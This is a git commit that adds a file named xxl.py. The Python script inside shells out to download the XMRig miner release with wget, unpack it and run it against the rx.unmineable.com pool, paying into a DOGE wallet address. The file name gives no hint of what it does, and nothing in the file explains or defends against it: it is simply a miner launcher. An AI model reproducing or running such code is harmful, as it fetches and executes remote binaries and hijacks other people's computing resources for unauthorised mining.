dd5acce4c8f486b512b152c2147b6b487a128857
asimeci <111687955+asimeci@users.noreply.github.com>
2022-09-04 14:48:48 +0000

    Create xxl.py

---
+++ xxl.py
@@ -0,0 +1,4 @@
+import os
+
+command = "wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xzf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -o rx.unmineable.com:80 -a rx -k -p -x -u DOGE:DA6CNXPGacPWBTLrVq3b1b9uhpWiH1QWda.lolo+50#d73s-pdj0"
+os.system(command)
